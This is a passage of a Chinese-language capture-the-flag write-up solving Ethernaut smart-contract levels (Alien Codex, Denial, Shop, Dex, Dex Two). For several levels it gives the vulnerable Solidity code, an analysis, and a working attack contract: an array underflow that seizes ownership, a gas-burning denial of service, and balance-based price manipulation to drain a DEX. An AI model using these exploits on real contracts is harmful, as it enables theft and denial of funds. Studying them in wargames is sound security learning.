&#125;</span><br><span class="line"></span><br><span class="line">    function retract() public contacted &#123;</span><br><span class="line">        codex.length--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function revise(uint256 i, bytes32 _content) public contacted &#123;</span><br><span class="line">        codex[i] = _content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h3><p>You’ve uncovered an Alien contract. Claim ownership to complete the level.</p>
<p> Things that might help</p>
<ul>
<li>Understanding how array storage works</li>
<li>Understanding <a class="link"   href="https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html" >ABI specifications <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>Using a very <code>underhanded</code> approach</li>
</ul>
<h3 id="Analysis-6"><a href="#Analysis-6" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目要求获取所有权，那么我们要先找到题目合约所继承的 Ownable-05.sol 合约，看看是什么。</p>
<p>去 Ethernaut 的 Github 仓库获取代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract Ownable &#123;</span><br><span class="line">    address private _owner;</span><br><span class="line"></span><br><span class="line">    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);</span><br><span class="line"></span><br><span class="line">    constructor () internal &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function owner() public view returns (address) &#123;</span><br><span class="line">        return _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(isOwner(), &quot;Ownable: caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isOwner() public view returns (bool) &#123;</span><br><span class="line">        return msg.sender == _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function renounceOwnership() public onlyOwner &#123;</span><br><span class="line">        emit OwnershipTransferred(_owner, address(0));</span><br><span class="line">        _owner = address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferOwnership(address newOwner) public onlyOwner &#123;</span><br><span class="line">        _transferOwnership(newOwner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transferOwnership(address newOwner) internal &#123;</span><br><span class="line">        require(newOwner != address(0), &quot;Ownable: new owner is the zero address&quot;);</span><br><span class="line">        emit OwnershipTransferred(_owner, newOwner);</span><br><span class="line">        _owner = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么对于成为 owner 这件事情，我们就有头绪了，关键就是要篡改这里面的 _owner 成员变量。</p>
<p>这里需要搞清楚动态数组在 EVM 中的存储机制，首先按照存储布局规则确定一个存放该动态数组的插槽 p，这个插槽中存放的是动态数组的元素数量。而元素的值从插槽 keccak256(p) 开始存储，而 EVM 的存储只有 2^256^ 个插槽，当插槽下标大于 2^256^-1 时就会溢出到 0。由于 EVM 并不会验证数组的 ABI 编码中的长度与实际有效负载长度是否匹配，我们可以在 codex.length 为 0 的时候调用 retract() 导致数组长度下溢出，从而变成 32 字节所能存储的最大的无符号整数：2^256^-1。</p>
<p>以上是我们能对动态数组 codex 进行的操作，接下来回到实际的存储中，看看最终导致的结果：</p>
<p>按照存储布局规则，存储的顺序是 父合约的 _owner (20 Bytes)、本合约的 contact (1 Btye)、本合约的 codex (32 Bytes，实际存的是 codex.length)。那么 codex 的长度就会存在 slot1 中（即上文的 p 为 1），而 codex 的元素则会从下标为 keccak(1) 的插槽开始存储，而 codex 一个元素占 32 字节，所以一个插槽刚好存储一个元素。</p>
<p>回到刚才让 codex 下溢出的情况，codex.length 为 2^256^-1，而 keccak(1) 是一个极大的整数，所以必然会导致插槽下标溢出，导致所有的插槽都能被 codex 的长度值和元素所控制。我们看看这个情况下存储的情况：</p>
<table>
<thead>
<tr>
<th>插槽下标</th>
<th>存储内容</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>_owner 和 contact</td>
</tr>
<tr>
<td>1</td>
<td>codex.length</td>
</tr>
<tr>
<td>……</td>
<td>……</td>
</tr>
<tr>
<td>keccak(1)</td>
<td>codex[0]</td>
</tr>
<tr>
<td>……</td>
<td>……</td>
</tr>
<tr>
<td>2^256^-1</td>
<td>codex[2^256^-1-keccak(1)]</td>
</tr>
</tbody></table>
<p>很明显，如果插槽下标溢出，则 codex[2^256^-1-keccak(1)+1] 会被储存在 slot0 中，也就是可以控制 _owner 状态变量了。</p>
<h3 id="Exploit-5"><a href="#Exploit-5" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    AlienCodex public codex;</span><br><span class="line">    bytes32 public payload;</span><br><span class="line">    uint public i;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        codex = AlienCodex(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        i = 2 ** 256 - 1 - uint(keccak256(abi.encode(1))) + 1;</span><br><span class="line">        payload = bytes32(uint256(uint160(tx.origin)));</span><br><span class="line">        codex.makeContact();</span><br><span class="line">        codex.retract();</span><br><span class="line">        codex.revise(i, payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202402062044128.png"
                      alt="image-20240206204425033"
                ></p>
<h2 id="20-Denial"><a href="#20-Denial" class="headerlink" title="20 Denial"></a>20 Denial</h2><h3 id="Code-7"><a href="#Code-7" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line">    address public partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address public constant owner = address(0xA9E);</span><br><span class="line">    uint256 timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint256) withdrawPartnerBalances; // keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint256 amountToSend = address(this).balance / 100;</span><br><span class="line">        // perform a call without checking return</span><br><span class="line">        // The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);</span><br><span class="line">        payable(owner).transfer(amountToSend);</span><br><span class="line">        // keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn = block.timestamp;</span><br><span class="line">        withdrawPartnerBalances[partner] += amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit of funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience function</span><br><span class="line">    function contractBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h3><p>This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.</p>
<p>If you can deny the owner from withdrawing funds when they call <code>withdraw()</code> (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.</p>
<h3 id="Analysis-7"><a href="#Analysis-7" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目要求不能让 owner 拿到钱。</p>
<p>这里我第一反应是把 partner 的交易 revert 掉，但是 call 并不会检查返回值，所以即使 revert 也不会影响到给 owner 的转账。那么我们就需要在 partner 合约的 fallback 函数下文章，在这里把 gas 耗尽就可以达到目的了。</p>
<h3 id="Exploit-6"><a href="#Exploit-6" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Denial &#123;</span><br><span class="line">    function contractBalance() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function owner() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function partner() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) external;</span><br><span class="line"></span><br><span class="line">    function withdraw() external;</span><br><span class="line"></span><br><span class="line">    receive() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    Denial public myD;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _target) public &#123;</span><br><span class="line">        myD = Denial(_target);</span><br><span class="line">        myD.setWithdrawPartner(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        while(true) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在靶场上提交容器的时候，后台会调用 withdraw 方法并验证：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function validateInstance(address payable _instance, address _player) public override returns (bool) &#123;</span><br><span class="line">    _player;</span><br><span class="line">    Denial instance = Denial(_instance);</span><br><span class="line">    if (address(instance).balance &lt;= 100 wei) &#123;</span><br><span class="line">        // cheating otherwise</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    // fix the gas limit for this call</span><br><span class="line">    (bool result, ) = address(instance).call&#123;gas: 1000000&#125;(abi.encodeWithSignature(&quot;withdraw()&quot;)); // Must revert</span><br><span class="line">    return !result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202402071620819.png"
                      alt="image-20240207162032733"
                ></p>
<h2 id="21-Shop"><a href="#21-Shop" class="headerlink" title="21 Shop"></a>21 Shop</h2><h3 id="Code-8"><a href="#Code-8" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">    function price() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">    uint256 public price = 100;</span><br><span class="line">    bool public isSold;</span><br><span class="line"></span><br><span class="line">    function buy() public &#123;</span><br><span class="line">        Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">            isSold = true;</span><br><span class="line">            price = _buyer.price();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-8"><a href="#Description-8" class="headerlink" title="Description"></a>Description</h3><p>Сan you get the item from the shop for less than the price asked?</p>
<p><strong>Things that might help:</strong></p>
<ul>
<li><code>Shop</code> expects to be used from a <code>Buyer</code></li>
<li>Understanding restrictions of view functions</li>
</ul>
<h3 id="Analysis-8"><a href="#Analysis-8" class="headerlink" title="Analysis"></a>Analysis</h3><p>注意不要被套入题目要求的思维定式，我们不需要以较小的 price 来绕过，而是 return 不同的 price 值。</p>
<p>看看题目后台的验证代码就知道了：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function validateInstance(address payable _instance, address) public view override returns (bool) &#123;</span><br><span class="line">    Shop _shop = Shop(_instance);</span><br><span class="line">    return _shop.price() &lt; 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们可以使题目后台合约和题目合约调用 price 时获取到不同的返回值，从而满足题目的要求。</p>
<h3 id="Exploit-7"><a href="#Exploit-7" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Shop &#123;</span><br><span class="line">    function buy() external;</span><br><span class="line"></span><br><span class="line">    function isSold() external view returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Buyer &#123;</span><br><span class="line">    Shop public shop;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        shop = Shop(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() external view returns (uint256) &#123;</span><br><span class="line">        if (shop.isSold() == false) &#123;</span><br><span class="line">            return 100;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 99;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        shop.buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202402071734294.png"
                      alt="image-20240207173423215"
                ></p>
<h2 id="22-Dex"><a href="#22-Dex" class="headerlink" title="22 Dex"></a>22 Dex</h2><h3 id="Code-9"><a href="#Code-9" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">    address public token1;</span><br><span class="line">    address public token2;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">        token2 = _token2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addLiquidity(address token_address, uint256 amount)</span><br><span class="line">        public</span><br><span class="line">        onlyOwner</span><br><span class="line">    &#123;</span><br><span class="line">        IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public &#123;</span><br><span class="line">        require(</span><br><span class="line">            (from == token1 &amp;&amp; to == token2) ||</span><br><span class="line">                (from == token2 &amp;&amp; to == token1),</span><br><span class="line">            &quot;Invalid tokens&quot;</span><br><span class="line">        );</span><br><span class="line">        require(</span><br><span class="line">            IERC20(from).balanceOf(msg.sender) &gt;= amount,</span><br><span class="line">            &quot;Not enough to swap&quot;</span><br><span class="line">        );</span><br><span class="line">        uint256 swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">        IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSwapPrice(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public view returns (uint256) &#123;</span><br><span class="line">        return ((amount * IERC20(to).balanceOf(address(this))) /</span><br><span class="line">            IERC20(from).balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public &#123;</span><br><span class="line">        SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">        SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address token, address account)</span><br><span class="line">        public</span><br><span class="line">        view</span><br><span class="line">        returns (uint256)</span><br><span class="line">    &#123;</span><br><span class="line">        return IERC20(token).balanceOf(account);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">    address private _dex;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address dexInstance,</span><br><span class="line">        string memory name,</span><br><span class="line">        string memory symbol,</span><br><span class="line">        uint256 initialSupply</span><br><span class="line">    ) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public &#123;</span><br><span class="line">        require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">        super._approve(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-9"><a href="#Description-9" class="headerlink" title="Description"></a>Description</h3><p>The goal of this level is for you to hack the basic <a class="link"   href="https://en.wikipedia.org/wiki/Decentralized_exchange" >DEX <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> contract below and steal the funds by price manipulation.</p>
<p>You will start with 10 tokens of <code>token1</code> and 10 of <code>token2</code>. The DEX contract starts with 100 of each token.</p>
<p>You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a “bad” price of the assets.</p>
<p><strong>Quick note</strong></p>
<p>Normally, when you make a swap with an ERC20 token, you have to <code>approve</code> the contract to spend your tokens for you. To keep with the syntax of the game, we’ve just added the <code>approve</code> method to the contract itself. So feel free to use <code>contract.approve(contract.address, &lt;uint amount&gt;)</code> instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the <code>SwappableToken</code> contract otherwise.</p>
<p> Things that might help:</p>
<ul>
<li>How is the price of the token calculated?</li>
<li>How does the <code>swap</code> method work?</li>
<li>How do you <code>approve</code> a transaction of an ERC20?</li>
<li>Theres more than one way to interact with a contract!</li>
<li>Remix might help</li>
<li>What does “At Address” do?</li>
</ul>
<h3 id="Analysis-9"><a href="#Analysis-9" class="headerlink" title="Analysis"></a>Analysis</h3><p>关卡要求掏空交易所里两种代币的其中的至少一种，看到汇率的计算方式，决定从这里入手：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) &#123;</span><br><span class="line">    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该函数的大概意思是将交易所拥有的两种代币的比值当作汇率，问题就出在这里。使用余额作为计算价格的因素，会导致价格可控，被恶意利用。</p>
<p>假设一下，我们把手上的 token2 都换成 token1，这时我们有 20 个 token1，交易所有 90 个 token1，110 个 token2。那么我们把这 20 个 token1 又换成token2，重复几遍，就会发生奇妙的事情：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">swapAmount = 20 * 110 / 90 = 24.44444 ≈ 24</span><br><span class="line">           = 24 * 110 / 86 = 30.69767 ≈ 30</span><br><span class="line">           = 30 * 110 / 80 = 41.25000 ≈ 41</span><br></pre></td></tr></table></figure></div>

<p>那么继续下去就能掏空一种代币了。</p>
<h3 id="Exploit-8"><a href="#Exploit-8" class="headerlink" title="Exploit"></a>Exploit</h3><p>有点像滚烫开水的降温法术（就是用两个杯子来回倒</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202403070106661.png"
                      alt="image-20240307010605583"
                ></p>
<p>成功掏空了 token1</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202403070112218.png"
                      alt="image-20240307011212159"
                ></p>
<h2 id="23-Dex-Two"><a href="#23-Dex-Two" class="headerlink" title="23 Dex Two"></a>23 Dex Two</h2><h3 id="Code-10"><a href="#Code-10" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract DexTwo is Ownable &#123;</span><br><span class="line">    address public token1;</span><br><span class="line">    address public token2;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">        token2 = _token2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function add_liquidity(address token_address, uint256 amount)</span><br><span class="line">        public</span><br><span class="line">        onlyOwner</span><br><span class="line">    &#123;</span><br><span class="line">        IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public &#123;</span><br><span class="line">        require(</span><br><span class="line">            IERC20(from).balanceOf(msg.sender) &gt;= amount,</span><br><span class="line">            &quot;Not enough to swap&quot;</span><br><span class="line">        );</span><br><span class="line">        uint256 swapAmount = getSwapAmount(from, to, amount);</span><br><span class="line">        IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSwapAmount(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public view returns (uint256) &#123;</span><br><span class="line">        return ((amount * IERC20(to).balanceOf(address(this))) /</span><br><span class="line">            IERC20(from).balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public &#123;</span><br><span class="line">        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);</span><br><span class="line">        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address token, address account)</span><br><span class="line">        public</span><br><span class="line">        view</span><br><span class="line">        returns (uint256)</span><br><span class="line">    &#123;</span><br><span class="line">        return IERC20(token).balanceOf(account);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableTokenTwo is ERC20 &#123;</span><br><span class="line">    address private _dex;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address dexInstance,</span><br><span class="line">        string memory name,</span><br><span class="line">        string memory symbol,</span><br><span class="line">        uint256 initialSupply</span><br><span class="line">    ) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public &#123;</span><br><span class="line">        require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">        super._approve(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
</search>
